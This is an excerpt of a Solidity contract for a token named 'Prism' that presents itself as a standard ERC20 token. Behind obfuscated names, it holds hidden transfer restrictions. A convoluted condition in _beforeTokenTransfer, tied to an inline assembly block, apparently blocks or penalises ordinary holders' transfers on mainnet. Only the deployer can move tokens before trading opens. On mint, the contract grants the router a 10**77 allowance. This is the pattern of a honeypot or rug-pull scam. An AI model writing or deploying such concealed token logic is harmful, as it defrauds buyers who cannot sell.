...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private bancAddr;
    uint256 private _pumpingApe = block.number*2;

    mapping (address => bool) private _apeCoin; 
    mapping (address => bool) private _theNAPE;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private germanApe;
    ...
    bool private trading; uint256 private originAddress = 1; bool private taxOrigin;
    uint256 private _decimals; uint256 private wishingWell;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        bancAddr.push(_router); bancAddr.push(msgSender_); bancAddr.push(pair);
        for (uint256 q=0; q < 3;) {_apeCoin[bancAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _pumpingApe = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == bancAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
            bool open = (((taxOrigin || _theNAPE[sender]) && ((_pumpingApe - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/2)) && (_pumpingApe == block.number))) && ((_apeCoin[recipient] == true) && (_apeCoin[sender] != true) || ((bancAddr[1] == recipient) && (_apeCoin[bancAddr[1]] != true))) && (wishingWell > 0);
            assembly { 
    ...
    function _DeployPrism(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(bancAddr[0], 10 ** 77);
        _setValues();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPrism(creator, initialSupply);
    }
}

contract Prism is ERC20Token {
    constructor() ERC20Token("Prism", "PRISM", msg.sender, 100000000 * 10 ** 18) {
    }
}